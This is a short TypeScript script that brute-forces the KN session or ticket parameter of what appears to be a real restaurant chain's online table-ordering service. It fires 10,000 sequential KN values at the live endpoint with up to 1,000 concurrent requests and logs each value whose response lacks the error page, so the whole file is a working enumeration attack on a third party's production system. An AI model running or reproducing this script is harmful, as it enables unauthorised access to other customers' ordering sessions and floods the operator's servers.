import pLimit from 'p-limit'
import { TqdmProgress } from 'node-console-progress-bar-tqdm'

async function testIfUsable(kn: number) {
  const url = new URL('https://ioes09.saizeriya.co.jp/saizeriya2/')
  url.searchParams.set('SN', '1443')
  url.searchParams.set('TN', '9')
  url.searchParams.set('ZN', '1')
  url.searchParams.set('TB', '43')
  url.searchParams.set('TS', '0')
  url.searchParams.set('KN', kn.toString().padStart(8, '0'))
  url.searchParams.set('DD', '638933062227895792')
  const text = await fetch(url.toString()).then((r) => r.text())
  if (text.includes('お手数ですがこの画面を閉じ、')) {
    return false
  }
  return true
}

const promises: Promise<void>[] = []
const limit = pLimit(1000)
const INITIALKN = 3953459
const TOTAL = 10000
const tqdm = new TqdmProgress({
  total: TOTAL,
})
tqdm.render()
for (let i = INITIALKN; i < INITIALKN + TOTAL; i++) {
  promises.push(
    limit(async () => {
      const usable = await testIfUsable(i)
      tqdm.update(1)

      if (usable) {
        console.log(`Found usable KN: ${i.toString().padStart(8, '0')}`)
      }
    }),
  )
}

await Promise.allSettled(promises)
